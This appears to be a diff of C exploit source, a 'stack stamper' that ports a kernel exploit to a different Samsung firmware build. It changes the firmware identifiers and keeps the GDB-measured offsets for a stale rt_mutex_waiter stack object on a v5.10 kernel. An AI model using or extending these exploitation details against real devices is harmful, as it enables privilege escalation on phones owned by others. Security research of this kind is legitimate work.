@@ -1,8 +1,8 @@
 /*
- * exp32 stack stamper — S908BXXSMGZB2 target override.
+ * exp32 stack stamper — S901BXXSNGZD7 target override.
  *
- * S908BXXSMGZB2 geometry:
- *   rt_waiter is at stack buffer +0x68 (live GDB measured: 0xffffffc00ac7bc70 vs gr32 0xffffffc00ac7bc08).
+ * S901BXXSNGZD7 geometry:
+ *   rt_waiter is at stack buffer +0x68 (live GDB measured: 0xffffffc00ac9bc70 vs gr32 0xffffffc00ac9bc08).
  *   stale rt_mutex_waiter starts at buffer + 0x68.
  */
 #define _GNU_SOURCE
@@ -25,7 +25,7 @@
 
 extern atomic_int g_consumer_go;
 
-/* S908BXXSMGZB2: stale rt_waiter lands at stamp-buffer +0x68 (live GDB measured). */
+/* S901BXXSNGZD7: stale rt_waiter lands at stamp-buffer +0x68 (live GDB measured). */
 #define EXP32_STAMP_OFF 0x68
 /* v5.10 rt_mutex_waiter = 80 bytes */
 #define EXP32_WAITER_BYTES 0x50
